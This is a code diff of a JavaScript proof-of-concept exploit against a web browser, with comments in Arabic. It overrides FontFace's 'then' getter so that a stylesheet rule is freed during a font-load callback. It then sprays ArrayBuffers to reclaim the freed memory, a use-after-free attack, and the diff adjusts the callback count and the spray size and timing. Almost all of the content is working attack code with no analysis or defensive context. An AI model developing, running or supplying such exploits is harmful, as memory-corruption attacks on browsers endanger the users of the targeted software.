@@ -18,35 +18,34 @@ window.onload = () => {
     Object.defineProperty(FontFace.prototype, 'then', {
         configurable: true,
         get() {
-            // تفقد الخاصية للتأكد من أن الاستدعاء يخص كائننا المستهدف
             if (this === A) {
                 callbackCount++;
                 
-                // ننتظر حتى يتم استدعاء setStatus عدة مرات لاستقرار المؤشر في الذاكرة
-                // ضبط هذا الرقم (مثلاً 1 أو 2 أو 3) هو مفتاح حل الثغرة في إصدارك
-                if (callbackCount === 2) { 
+                // تجربة العداد عند الاستدعاء الأول المباشر لـ setStatus
+                if (callbackCount === 1) { 
                     
-                    // تحرير الكائن (Use-After-Free)
+                    // تدمير الكائن المستهدف من الذاكرة
                     document.getElementById('s').sheet.deleteRule(0);
                     
-                    // محاولة ملء الفراغ بكائنات خفيفة فوراً دون إثارة الحماية
-                    let holder = [];
-                    for (let i = 0; i < 10; i++) {
-                        holder.push(new ArrayBuffer(0x200)); 
-                    }
-                    
-                    // إجبار المحرك على قراءة الذاكرة المستبدلة
-                    document.body.offsetTop;
-                    
-                    // إذا وصلنا هنا واستقر المتصفح، ستتحول الشاشة للون الأخضر!
-                    document.body.style.background = "green";
+                    // استخدام setTimeout بفترة 0 لفصل التنفيذ ومنع التجميد الصامت
+                    setTimeout(() => {
+                        let holder = [];
+                        for (let i = 0; i < 20; i++) {
+                            holder.push(new ArrayBuffer(0x400)); 
+                        }
+                        
+                        // قراءة المؤشر بعد إعادة التهيئة
+                        document.body.offsetTop;
+                        
+                        // تحويل الشاشة للأخضر لإثبات الاستقرار بعد الـ Use-After-Free
+                        document.body.style.background = "green";
+                    }, 0);
                 }
             }
             return undefined;
         }
     });
 
-    // إطلاق عملية الضخ (Pump)
     document.fonts.load('1em targetFont', 'AB');
 };
 </script>
